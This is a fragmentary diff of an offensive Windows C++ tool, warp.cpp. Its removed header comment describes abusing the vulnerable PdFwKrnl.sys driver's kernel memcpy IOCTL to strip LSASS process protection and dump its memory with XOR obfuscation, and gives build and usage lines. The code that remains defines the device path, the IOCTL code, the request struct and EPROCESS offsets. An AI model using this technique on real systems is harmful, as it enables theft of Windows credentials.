@@ -1,28 +1,8 @@
-// warp.cpp — legacy single-binary variant using PdFwKrnl.sys.
-//
-// Historical predecessor to cascade.cpp. Uses the Trend Micro
-// PdFwKrnl.sys "arbitrary kernel memcpy" primitive (IOCTL 0x80002014) as an
-// alternate BYOVD vector when BiosToolCommonDriver isn't viable.
-//
-// This binary does ONE thing: strip PPL from LSASS and MiniDumpWriteDump it
-// with XOR obfuscation. All the fancy cascade features (dump-rpm, callback
-// patching, kernel-only dump, TCP exfil) are NOT here — use cascade.exe
-// with --driver-type pdfwkrnl for the full feature set.
-//
-// Retained for the case where you need a minimal single-purpose binary with
-// no unused code paths.
-//
-// Build:
-//   x86_64-w64-mingw32-g++ -O2 -s -static-libgcc -static-libstdc++ \
-//       src/warp.cpp -ldbghelp -lpsapi -o warp.exe
-//
-// Usage:
-//   warp.exe --driver PATH --out lsass.bin [--xor-key 55]
-
 #include <windows.h>
 #include <psapi.h>
 #include <dbghelp.h>
 #include <winternl.h>
+#include <cstdint>
 #include <cstdio>
 #include <cstring>
 #include <cstdlib>
@@ -35,7 +15,6 @@
 #define DEVICE_PATH   "\\\\.\\PdFwKrnl"
 #define IOCTL_MEMCPY  0x80002014
 
-// PdFwKrnl IOCTL structure: {dst_va, src_va, size}
 #pragma pack(push, 1)
 struct PdMemCpyReq {
     uint64_t dst;
@@ -44,7 +23,6 @@ struct PdMemCpyReq {
 };
 #pragma pack(pop)
 
-// Windows 11 22H2 offsets
 constexpr ULONG OFF_UNIQUE_PID   = 0x440;
 constexpr ULONG OFF_ACTIVE_LINKS = 0x448;
 constexpr ULONG OFF_PROTECTION   = 0x87A;
